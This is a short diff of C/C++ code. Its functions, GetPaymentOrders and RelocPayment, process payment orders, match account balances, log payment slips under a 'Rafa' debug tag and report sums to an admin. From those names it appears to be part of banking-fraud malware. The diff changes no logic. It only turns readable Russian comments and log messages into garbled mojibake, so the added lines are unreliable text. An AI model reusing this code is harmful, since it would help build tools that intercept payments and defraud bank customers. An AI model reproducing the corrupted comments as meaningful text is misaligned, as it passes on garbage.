-			//сохраняем баланс
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			po->balans = 0;
 			for( int i = 0; i < c_findedBalans; i++ )
 			{
@@ -2251,15 +2262,15 @@ static PaymentOrder* GetPaymentOrders()
 					po->balans = to; CopyDataPayment( to, findedBalans[i].balans );
 				}
 			}
-			if( po->balans == 0 ) //выслали неизвестный счет, платит незачем
+			if( po->balans == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
-				DBGRAFA( "Rafa", "Получена платежка с неизвестным счетом %s", po->sendAcc );
+				DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", po->sendAcc );
 				po->balans = to; *to++ = 0;
 				res = 0;
 			}
 			else
 			{
-				DBGRAFA( "Rafa", "Получена платежка" );
+				DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 				DBGPrintPayment(po);
 				res = po;
 				SendLogToAdmin( 1, po->sum );
@@ -2274,7 +2285,7 @@ static PaymentOrder* GetPaymentOrders()
 
 static void RelocPayment( char* base )
 {
-	int d = (char*)paymentOrders - base; //разница области памяти
+	int d = (char*)paymentOrders - base; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	for( int i = 0; i < c_paymentOrders; i++ )
 	{
 		paymentOrders[i].sendAcc += d;
